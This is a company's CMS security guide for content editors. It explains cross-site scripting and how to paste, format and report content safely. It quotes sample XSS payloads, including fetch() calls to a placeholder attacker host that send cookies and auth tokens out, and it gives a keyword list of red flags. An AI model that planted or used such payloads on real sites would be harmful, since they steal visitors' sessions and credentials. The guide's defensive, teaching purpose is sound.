# Content Security Guidelines for Admins

## Overview

This guide is for administrators who create and edit blog posts, service pages, and other content in the Tail Wagging Websites CMS. Following these guidelines helps prevent security vulnerabilities and keeps the site safe.

**Audience**: Admins, Content Editors, Marketing Team  
**Last Updated**: 2025-01-14  
**Importance**: ⚠️ **CRITICAL** - Failure to follow these guidelines can compromise site security

---

## Understanding XSS (Cross-Site Scripting)

### What is XSS?

XSS is a security vulnerability where malicious code (usually JavaScript) is injected into web pages and executed in visitors' browsers. This can:

- **Steal user sessions** (hijack logins)
- **Steal sensitive data** (credit cards, passwords)
- **Deface the website** (change content shown to users)
- **Redirect users** to phishing sites
- **Install malware** on visitors' devices

### How XSS Happens in CMS Systems

When you paste content from external sources (Word documents, other websites, email), you might accidentally include hidden malicious code:

```html
<!-- ❌ DANGEROUS: Hidden in copied HTML -->
<img src="x" onerror="fetch('https://evil.com/steal?data=' + document.cookie)">

<!-- ❌ DANGEROUS: Looks innocent but steals data -->
<a href="javascript:void(fetch('https://evil.com/collect?token=' + localStorage.getItem('auth')))">Click here</a>

<!-- ❌ DANGEROUS: Embedded script in styling -->
<div style="background: url('javascript:alert(document.cookie)')">Content</div>
```

Even if you don't intentionally add malicious code, copying from untrusted sources can bring it in.

---

## Safe Content Practices

### ✅ DO: Safe Content Creation

1. **Write directly in the CMS** whenever possible
   - Use the built-in rich text editor
   - Avoid copying HTML from external sources

2. **Use Markdown for formatting**
   - Headings: `# Heading 1`, `## Heading 2`, `### Heading 3`
   - Bold: `**bold text**`
   - Italic: `*italic text*`
   - Links: `[link text](https://example.com)`
   - Lists: `- Item 1`, `- Item 2`

3. **If you must paste from external sources**:
   - Paste as **plain text** first (Ctrl+Shift+V or Cmd+Shift+V)
   - Then apply formatting manually using the editor
   - Never paste HTML directly from unknown sources

4. **For images**:
   - Upload images through the CMS upload button
   - Use the provided image URL from Supabase Storage
   - Don't embed images from external URLs (they could change or be malicious)

5. **For videos**:
   - Use trusted embed codes from YouTube, Vimeo only
   - Don't accept embed codes from unknown video hosting sites
   - Test the preview before publishing

### ❌ DON'T: Dangerous Practices

1. **Don't copy HTML from:**
   - Random websites
   - Untrusted email newsletters
   - Unknown third parties
   - AI-generated HTML (unless from trusted source)

2. **Don't use:**
   - `<script>` tags (blocked by sanitizer, but still don't try)
   - `javascript:` URLs in links
   - `onclick`, `onerror`, `onload` attributes
   - Inline `<style>` tags with expressions
   - `<iframe>` tags (unless from trusted sources like Calendly)

3. **Don't trust:**
   - Guest blog post submissions with HTML
   - "Optimized" content from freelancers (always review)
   - Auto-generated content without inspection
   - Old content from previous CMS (needs review)

---

## CMS Safety Features

Our CMS has **multiple layers of protection**:

### 1. Input Sanitization (DOMPurify)

All HTML content is automatically cleaned before being displayed to visitors:

- Removes `<script>` tags
- Strips dangerous attributes (`onclick`, `onerror`)
- Blocks `javascript:` URLs
- Removes potentially harmful CSS
- Allows safe HTML like `<p>`, `<strong>`, `<a>`, `<img>`

**This means**: Even if you accidentally paste malicious code, it won't harm visitors. However, it's still better to avoid pasting unsafe content in the first place.

### 2. Content Security Policy (CSP)

Our site has strict rules about what scripts can run:

- Only scripts from our own domain
- Only specific trusted third-party domains (Stripe, Calendly)
- No inline scripts in HTML content
- No eval() or dynamic code execution

### 3. Admin-Only Access

Only logged-in admins with the `admin` role can:

- Create blog posts
- Edit existing posts
- Publish/unpublish content
- Delete posts

Regular users cannot modify content, even if they find the admin panel URL.

---

## Red Flags to Watch For

If you see any of these in content you're about to paste, **DO NOT PASTE IT**:

⚠️ **Warning Signs**:
- `<script>` tags anywhere
- `javascript:` in links
- `onclick=`, `onload=`, `onerror=` attributes
- `eval(...)` calls
- `document.cookie` references
- `localStorage` or `sessionStorage` access
- Obfuscated or encoded text (e.g., `&#x6a;&#x61;vascript:`)
- External `<iframe>` from unknown domains
- Base64-encoded strings in HTML attributes

⚠️ **Suspicious Requests**:
- Someone asks you to paste "this code for analytics"
- External party sends "optimized HTML" for your blog
- Offer to "improve SEO" by adding specific scripts
- Plugin or tool that requires pasting HTML
- Guest blogger sends pre-formatted HTML instead of plain text

**What to do**: Delete the content and ask the source to provide plain text or Markdown instead.

---

## Step-by-Step: Safe Blog Post Creation

### Creating a New Post

1. **Log in** to admin panel: `/admin/blog`
2. **Click** "New Post" button
3. **Write title** directly in the Title field
4. **Write excerpt** (plain text summary)
5. **Write content** using the editor's formatting tools OR Markdown:

**Markdown Example**:
```markdown
# Dog Walking Tips for Winter

Winter walks can be challenging, but with the right preparation, your furry friend will stay safe and happy.

## Essential Winter Gear

- **Paw Protection**: Booties or paw balm
- **Warm Coat**: For short-haired breeds
- **Visibility Gear**: LED collar or reflective vest

## Safety Checklist

Before heading out:
1. Check weather conditions
2. Limit walk duration in extreme cold
3. Dry paws thoroughly after walks

[Book a winter dog walking service](https://tailwaggingwebdesign.com/contact)
```

6. **Upload cover image** using the upload button (don't paste img URLs)
7. **Fill SEO fields**: meta title, meta description, OG image URL
8. **Add FAQ schema** if applicable (JSON format, not HTML)
9. **Preview** the post before publishing
10. **Publish** when ready

### Editing Existing Posts

1. **Never** delete all content and paste from external source
2. **Edit** specific sections that need changes
3. **Preserve** existing formatting that works
4. **Test** changes in preview mode
5. **Save** incrementally (don't make all changes at once)

### If You Must Paste from Word or Google Docs

1. **Copy** the content from Word/Docs
2. **Paste** into a plain text editor first (Notepad, TextEdit)
3. **Copy** from the plain text editor
4. **Paste** into CMS (this removes all hidden formatting)
5. **Re-apply** formatting using CMS tools
6. **Check** preview carefully

---

## FAQ Schema Safety

Our blog posts support FAQ schema for SEO (rich snippets in Google). FAQ data is stored as JSON, which is safer than HTML, but still has rules:

### ✅ Safe FAQ Format

```json
[
  {
    "question": "How long should winter dog walks be?",
    "answer": "For most dogs, 15-30 minutes is safe in cold weather. Adjust based on breed, age, and temperature."
  },
  {
    "question": "Do dogs need coats in winter?",
    "answer": "Short-haired, small, or senior dogs benefit from coats when temperatures drop below 45°F (7°C)."
  }
]
```

### ❌ Unsafe FAQ Format

```json
[
  {
    "question": "<script>alert('xss')</script>",
    "answer": "This would be blocked, but don't try it"
  }
]
```

**Rule**: FAQ questions and answers should be plain text only. No HTML, no special characters beyond punctuation.

---

## Reporting Suspicious Content

If you receive content that seems suspicious or you're unsure if it's safe:

**Don't Paste It!**

Instead:

1. **Save** the suspicious content to a text file
2. **Email** it to: security@tailwaggingwebdesign.com
3. **Include** context: Where did it come from? Who sent it? What's it supposed to do?
4. **Wait** for security team to review before using

**We'd rather take 24 hours to verify than compromise the site.**

---

## Training & Certification

All admins with content creation privileges must:

- [ ] Read this document thoroughly
- [ ] Complete annual security awareness training
- [ ] Pass XSS recognition quiz (internal)
- [ ] Acknowledge understanding of guidelines

**Acknowledgment**: By creating content in this CMS, you acknowledge that you understand these security guidelines and will follow them to protect the site and our users.

---

## Quick Reference Card

**Print and keep near your workspace:**

### ✅ SAFE
- Writing directly in CMS
- Using Markdown formatting
- Uploading images via CMS
- Pasting plain text (Ctrl+Shift+V)
- Copying from your own previous posts

### ❌ UNSAFE
- Pasting HTML from external sites
- Accepting "pre-optimized" HTML from others
- Using `<script>` tags
- Copying from untrusted emails
- Embedding videos from unknown hosts

### 🚨 STOP IMMEDIATELY IF YOU SEE
- `<script>`
- `javascript:`
- `onclick=`
- `eval(`
- `document.cookie`
- Base64-encoded strings in HTML

**When in doubt, ask the security team!**

---

## Contact & Support

**Security Questions**: security@tailwaggingwebdesign.com  
**CMS Support**: support@tailwaggingwebdesign.com  
**Training Requests**: training@tailwaggingwebdesign.com

**Emergency**: If you accidentally published malicious content:
1. Immediately unpublish the post
2. Email security@tailwaggingwebdesign.com with subject "URGENT: Malicious Content Published"
3. Don't try to fix it yourself

---

**Version**: 1.0  
**Last Updated**: 2025-01-14  
**Next Review**: 2025-07-14
